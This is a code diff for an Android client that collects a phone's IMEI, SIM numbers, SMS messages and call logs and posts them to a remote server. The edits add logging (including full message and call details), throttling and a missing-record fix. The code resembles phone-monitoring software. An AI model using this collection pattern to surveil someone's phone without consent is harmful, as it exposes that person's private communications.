@@ -16,12 +16,12 @@ import java.util.Scanner;
 import java.util.Set;
 
 import it.cf.bloodhoud.client.android.App;
+import it.cf.bloodhoud.client.android.Utils;
 import it.cf.bloodhoud.client.android.model.Call;
 import it.cf.bloodhoud.client.android.model.ContactManager;
 import it.cf.bloodhoud.client.android.model.Phone;
 import it.cf.bloodhoud.client.android.model.Sms;
 import it.cf.bloodhoud.client.android.model.SmsFactory;
-import it.cf.bloodhoud.client.android.model.Utils;
 import it.cf.bloodhoud.client.android.serviceApp.RepositoryLocalSQLLite;
 
 import org.apache.commons.lang3.StringUtils;
@@ -43,6 +43,8 @@ import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
+import android.os.SystemClock;
+import android.util.Log;
 
 public class SendDataToServerReceiver extends BroadcastReceiver
     {
@@ -76,12 +78,13 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                     {
                         this.prefs = context.getSharedPreferences(App.APP_FILE_PREFERENCES, Context.MODE_PRIVATE);
                         this.context = context;
-                        repository = new RepositoryLocalSQLLite(context);
+                        repository = RepositoryLocalSQLLite.getRepository(context);
                     }
 
                 @Override
                 protected Void doInBackground(Void... params)
                     {
+                        LOG.debug(">>>>>>>>>> START SEND DATA TO SERVER");
                         if (isNetworkAvailable())
                             {
                                 LOG.debug("Network available");
@@ -106,11 +109,13 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                                 String urlForSendCall = buildUrlForSendCallToServer(serverUrl);
                                 LOG.debug("Url for send call {}", urlForSendCall);
                                 sendCallToServer(urlForSendCall);
+                                
                             }
                         else
                             {
                                 LOG.debug("Network NOT available");
                             }
+                        LOG.debug("END SEND DATA TO SERVER <<<<<<<<<<");
                         return null;
                     }
 
@@ -139,6 +144,7 @@ public class SendDataToServerReceiver extends BroadcastReceiver
 
                 private void sendPhoneToServer(String urlForSendPhone)
                     {
+                        LOG.debug(">>>>> Send PHONE to server");
                         Phone phone;
                         try
                             {
@@ -146,11 +152,20 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                                 phone = repository.getPhone(deviceId);
                                 if (phone == null)
                                     {
-                                        LOG.error("Il phone di deviceId {} non prsente nel local DB", deviceId);
+                                        LOG.warn("Il phone di deviceId {} non presente nel local DB. Lo inserisco.", deviceId);
+
+                                        String deviceModel = Utils.getDeviceName();
+                                        phone = new Phone(deviceId, deviceModel);
+                                        if (repository.writePhone(phone) > 0){
+                                            LOG.debug("Il phone di deviceId {} inserito nel DB. {}", deviceId, phone.toString());
+                                        }
+                                        else{
+                                            LOG.error("Il phone di deviceId {} NON è stato inserito nel DB.", deviceId);
+                                        }
                                     }
-                                else if (phone.getServerSyncro() < 1)
+                                if (phone.getServerSyncro() < 1)
                                     {
-                                        LOG.info("Sending {}", phone);
+                                        LOG.debug("Sending {}", phone);
 
                                         HttpURLConnection connection = openNewConnection(urlForSendPhone);
                                         String postParameters = buildPostParameter(phone);
@@ -161,27 +176,30 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                                         String remoteId = parseServerResponseAndGetRemoteId(response);
                                         if (StringUtils.isBlank(remoteId))
                                             {
-                                                LOG.debug("Problem on the server");
+                                                LOG.warn("Problem on the server, remote id is empty");
                                             }
                                         else
                                             {
                                                 repository.markLikeSendedToServer(phone, remoteId);
-                                                LOG.debug("Phone sended to server. RemoteId =  {}", remoteId);
+                                                LOG.info("Phone sended to server. RemoteId =  {}. {}", remoteId, phone.toString());
                                             }
                                     }
-                                else{
-                                    LOG.debug("Phone già inviato al server. {}", phone);
-                                }
+                                else
+                                    {
+                                        LOG.debug("Phone già inviato al server. {}", phone);
+                                    }
 
                             }
                         catch (Exception e)
                             {
                                 LOG.error(e.getMessage());
                             }
+                        LOG.debug("Send PHONE to server <<<<<<<");
                     }
 
                 private void sendSmsToServer(String urlForSendSms)
                     {
+                        LOG.debug(">>>>> Send SMS to server");
                         List<Sms> messages;
                         try
                             {
@@ -202,24 +220,27 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                                         String remoteId = parseServerResponseAndGetRemoteId(response);
                                         if (StringUtils.isBlank(remoteId))
                                             {
-                                                LOG.debug("Problem on the server");
+                                                LOG.warn("Problem on the server, remote id is empty");
                                             }
                                         else
                                             {
                                                 repository.markLikeSendedToServer(sms, remoteId);
-                                                LOG.debug("Sms sended to server. RemoteId =  {}", remoteId);
+                                                LOG.info("Sms sended to server. RemoteId =  {}, {}", remoteId, sms.toString());
                                             }
+                                        
+                                        SystemClock.sleep(300);
                                     }
                             }
                         catch (Exception e)
                             {
                                 LOG.error(e.getMessage());
                             }
+                        LOG.debug("Send SMS to server <<<<<");
                     }
 
-                
                 private void sendCallToServer(String urlForSendCall)
                     {
+                        LOG.debug(">>>>> Send CALL to server");
                         List<Call> messages;
                         try
                             {
@@ -240,22 +261,24 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                                         String remoteId = parseServerResponseAndGetRemoteId(response);
                                         if (StringUtils.isBlank(remoteId))
                                             {
-                                                LOG.debug("Problem on the server");
+                                                LOG.warn("Problem on the server, remote id is empty");
                                             }
                                         else
                                             {
                                                 repository.markLikeSendedToServer(call, remoteId);
-                                                LOG.debug("Call sended to server. RemoteId =  {}", remoteId);
+                                                LOG.info("Call sended to server. RemoteId =  {}. {}", remoteId, call.toString());
                                             }
+                                        
+                                        SystemClock.sleep(50);
                                     }
                             }
                         catch (Exception e)
                             {
                                 LOG.error(e.getMessage());
                             }
+                        LOG.debug("Send CALL to server <<<<<");
                     }
-                
-                
+
                 private HttpURLConnection openNewConnection(String urlToConnect) throws IOException
                     {
                         // if you are using https, make sure to import java.net.HttpsURLConnection
@@ -272,19 +295,20 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                         return connection;
                     }
 
-                private String buildPostParameter(Phone phone) throws UnsupportedEncodingException{
-                    StringBuilder postParam = new StringBuilder();
-                    // you need to encode ONLY the values of the parameters
-                    // "imei=123456789012341&name=xxxxxxxx&phoneNumberSim1=xxxxx&phoneNumberSim1=xxxxx"
-                    postParam.append("imei=").append(URLEncoder.encode(phone.getDeviceId(), UTF));
-                    postParam.append("&");
-                    postParam.append("name=").append(URLEncoder.encode(phone.getModelPhone(), UTF));
-                    postParam.append("&");
-                    postParam.append("phoneNumberSim1=").append(URLEncoder.encode(phone.getNumberSim1(), UTF));
-                    postParam.append("&");
-                    postParam.append("phoneNumberSim2=").append(URLEncoder.encode(phone.getNumberSim2(), UTF));
-                    return postParam.toString();
-                }
+                private String buildPostParameter(Phone phone) throws UnsupportedEncodingException
+                    {
+                        StringBuilder postParam = new StringBuilder();
+                        // you need to encode ONLY the values of the parameters
+                        // "imei=123456789012341&name=xxxxxxxx&phoneNumberSim1=xxxxx&phoneNumberSim1=xxxxx"
+                        postParam.append("imei=").append(URLEncoder.encode(phone.getDeviceId(), UTF));
+                        postParam.append("&");
+                        postParam.append("name=").append(URLEncoder.encode(phone.getModelPhone(), UTF));
+                        postParam.append("&");
+                        postParam.append("phoneNumberSim1=").append(URLEncoder.encode(phone.getNumberSim1(), UTF));
+                        postParam.append("&");
+                        postParam.append("phoneNumberSim2=").append(URLEncoder.encode(phone.getNumberSim2(), UTF));
+                        return postParam.toString();
+                    }
 
                 private String buildPostParameter(Sms sms) throws UnsupportedEncodingException
                     {
@@ -304,35 +328,30 @@ public class SendDataToServerReceiver extends BroadcastReceiver
                     }
 
                 private String buildPostParameter(Call call) throws UnsupportedEncodingException
-                {
-                    StringBuilder postParam = new StringBuilder();
-                    // you need to encode ONLY the values of the parameters
+                    {
+                        StringBuilder postParam = new StringBuilder();
+                        // you need to encode ONLY the values of the parameters
 
-                    /*
-                    * direction=outgoing/incoming
-                    * phoneNumber=0123456789 
-                    * timestampStart=YYYY-MM-DDTHH:mm:ss.000Z (UTC)  
-                    * timestampEnd=YYYY-MM-DDTHH:mm:ss.000Z (UTC) 
-                    * nameContact=xxxx
-                    * state=xxxx
-                    * duration=xx
-                    */
-                    postParam.append("direction=").append(URLEncoder.encode(call.getDirection().name().toLowerCase(), UTF));
-                    postParam.append("&");
-                    postParam.append("phoneNumber=").append(URLEncoder.encode(call.getPhoneNumber(), UTF));
-                    postParam.append("&");
-                    postParam.append("nameContact=").append(URLEncoder.encode(call.getNameContact(), UTF));
-                    postParam.append("&");
-                    postParam.append("timestampStart=").append(URLEncoder.encode(call.getTimestampStartCallFormatted(), UTF));
-                    postParam.append("&");
-                    postParam.append("timestampEnd=").append(URLEncoder.encode(call.getTimestampEndCallFormatted(), UTF));
-                    postParam.append("&");
-                    postParam.append("state=").append(URLEncoder.encode(call.getState().name().toLowerCase(), UTF));
-                    postParam.append("&");
-                    postParam.append("duration=").append(URLEncoder.encode(String.valueOf(call.getCallDurationSec()), UTF));
-                    return postParam.toString();
-                }
-                
+                        /*
+                         * direction=outgoing/incoming phoneNumber=0123456789 timestampStart=YYYY-MM-DDTHH:mm:ss.000Z (UTC)
+                         * timestampEnd=YYYY-MM-DDTHH:mm:ss.000Z (UTC) nameContact=xxxx state=xxxx duration=xx
+                         */
+                        postParam.append("direction=").append(URLEncoder.encode(call.getDirection().name().toLowerCase(), UTF));
+                        postParam.append("&");
+                        postParam.append("phoneNumber=").append(URLEncoder.encode(call.getPhoneNumber(), UTF));
+                        postParam.append("&");
+                        postParam.append("nameContact=").append(URLEncoder.encode(call.getNameContact(), UTF));
+                        postParam.append("&");
+                        postParam.append("timestampStart=").append(URLEncoder.encode(call.getTimestampStartCallFormatted(), UTF));
+                        postParam.append("&");
+                        postParam.append("timestampEnd=").append(URLEncoder.encode(call.getTimestampEndCallFormatted(), UTF));
+                        postParam.append("&");
+                        postParam.append("state=").append(URLEncoder.encode(call.getState().name().toLowerCase(), UTF));
+                        postParam.append("&");
+                        postParam.append("duration=").append(URLEncoder.encode(String.valueOf(call.getCallDurationSec()), UTF));
+                        return postParam.toString();
+                    }
+
                 private String senDataToServerWithPost(HttpURLConnection connection, String postParameters) throws IOException
                     {
                         // Android documentation suggested that you set the length of the data you are sending to the server, BUT
